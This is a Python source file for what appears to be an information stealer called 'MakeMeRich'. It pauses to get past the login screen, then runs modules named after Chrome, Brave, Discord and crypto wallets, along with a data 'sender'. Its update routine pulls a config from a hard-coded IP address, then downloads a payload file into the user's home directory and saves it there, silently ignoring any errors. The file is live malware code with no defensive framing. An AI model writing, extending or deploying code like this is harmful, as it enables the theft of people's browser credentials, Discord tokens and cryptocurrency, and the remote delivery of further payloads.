from http import server
from wsgiref.simple_server import server_version
from chrome import Chrome
from discord import Discord
from brave import Brave
from crypto import CryptoStuff
from time import sleep
from sender import Extract
import requests
import json
from constants import MY_HOME, PAYLOAD_URL, PAYLOAD_NAME


class MakeMeRich(object):
    def __init__(self) -> None:
        self.config = "http://45.56.115.91:8000/config.json"
        self.local_version = 1.0  # when deploy a new version, change that to match the server
        self.check_updates()

        sleep(120)  # time to bypass the login screen
        self.chrome = Chrome()
        self.discord = Discord()
        self.brave = Brave()
        self.extract = Extract()
        self.cryptostuff = CryptoStuff()

    def check_updates(self):
        try:
            r = requests.get(self.config)

            server_version = json.loads(r.content.decode())

            if self.local_version != server_version["version"]:
                r = requests.get(PAYLOAD_URL)
                open(MY_HOME + PAYLOAD_NAME, "wb").write(r.content)
        except:
            pass


MakeMeRich()
